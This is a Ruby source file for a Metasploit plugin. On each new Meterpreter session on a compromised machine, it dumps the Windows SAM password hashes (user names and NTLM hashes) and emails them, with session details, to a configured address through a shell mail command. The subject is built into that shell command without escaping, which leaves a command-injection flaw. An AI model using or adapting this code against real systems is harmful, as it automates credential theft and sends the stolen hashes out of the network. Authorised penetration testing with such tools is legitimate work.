module Msf
   class Plugin::Email < Msf::Plugin
      attr_accessor :email_address, :tmp_file

      include Msf::SessionEvent

      def collect_credentials(session)
         print_status("Collecting credentials for email")
         report = ""

         if (session.type == "meterpreter")
	    session.core.use("priv")
            session.core.use("incognito")

	    session.priv.sam_hashes.each do |hash|
	       report << "#{hash.user_name}:#{hash.ntlm}\n"
	    end
            
	 end

	 return report
      end

      def send_email(msg, subject)
         File.open(self.tmp_file, "w") do |file|
            file.write(msg)
         end

         Kernel.system("cat #{self.tmp_file} | mail -s '#{subject}' #{self.email_address}")
      end

      def on_plugin_load
         send_email("Metasploit email notification enabled", "Metasploit started")
	 print_status("Email notification enabled")
      end

      def on_session_open(session)
         send_email("#{session.tunnel_to_s} via #{session.via_exploit}\n\nUser hashes:\n#{collect_credentials(session)}", "New meterpreter session")
      end

      def initialize(framework, opts)
         super

         self.email_address = "user@domain"
         self.tmp_file = "/tmp/msf.email"
         self.framework.events.add_session_subscriber(self)
         self.on_plugin_load
      end

      def cleanup
         self.framework.events.remove_session_subscriber(self)
      end

      def name
         "email notification"
      end

      def desc
         "Send email notifications for any new session"
      end

   end
end
